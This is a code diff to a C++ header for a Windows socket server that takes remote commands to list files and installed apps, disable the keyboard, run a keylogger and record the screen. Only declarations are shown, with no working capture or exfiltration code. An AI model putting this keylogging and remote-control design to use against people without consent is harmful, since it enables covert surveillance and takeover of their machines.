@@ -1,4 +1,5 @@
-#pragma once
+#ifndef SERVER_SOCKET_HPP
+#define SERVER_SOCKET_HPP
 
 #include <iostream>
 #include <unordered_map>
@@ -12,6 +13,7 @@
 #pragma comment(lib, "ws2_32.lib")
 
 #include "./../WindowAPI/winAPI.hpp"
+#include "./../WindowAPI/KeyboardDisabler.hpp"
 
 #define PORT 8080
 #define SERVER_IP "127.0.0.1"
@@ -37,6 +39,8 @@ enum MessageType {
     LIST_INSTALLED_APP,
     LIST_FILES,
     DISABLE_KEYBOARD,
+    ENABLE_KEYBOARD,
+    DISABLE_KEYLOGGER,
     KEY_LOGGER,
     SCREEN_RECORDING
 };
@@ -54,46 +58,38 @@ private:
 
     void initializeHandlers();
 
-    WinAPI winAPI;
+    WinAPI *winAPI;
+
+    Keylogger *keylogger;
+
+    KeyboardDisabler *keyboardDisabler;
 
     std::string response;
-
 
     std::atomic<bool> isKeyboardDisabled;
     
     std::thread keyboardThread;
 
-    void disableKeyboardThread() {
-        winAPI.disableKeyboard();
-    }
+    std::thread keyloggerThread;
 
 public:
     ServerSocket();
 
-    ~ServerSocket() {
-        closesocket(serverSocket);
-        WSACleanup();
-    }
+    ~ServerSocket();
 
     std::vector<std::string> parseCommand(const std::string &command);
 
     void sendResponse(SOCKET &clientSocket, const std::string& response);  
 
-    void sendIPAddress(SOCKET &clientSocket) {
-        const char* ipAddress = SERVER_IP;
-        send(clientSocket, ipAddress, static_cast<int>(strlen(ipAddress)), 0);
-        std::cout << "Sending IP address: " << ipAddress << '\n';
-    }
+    void sendIPAddress(SOCKET &clientSocket);
 
-    void sendMessage(SOCKET &clientSocket, const char* message) {
-        send(clientSocket, message, static_cast<int>(strlen(message)), 0);
-    }
+    void sendMessage(SOCKET &clientSocket, const char* message);
 
-    SOCKET getSocket() {
-        return serverSocket;
-    }
+    SOCKET getSocket() { return serverSocket; }
 
     void handleEvent(SOCKET &clientSocket, const std::string& message);
 
     void sendFile(SOCKET &clientSocket, const std::string& filePath);
 };
+
+#endif
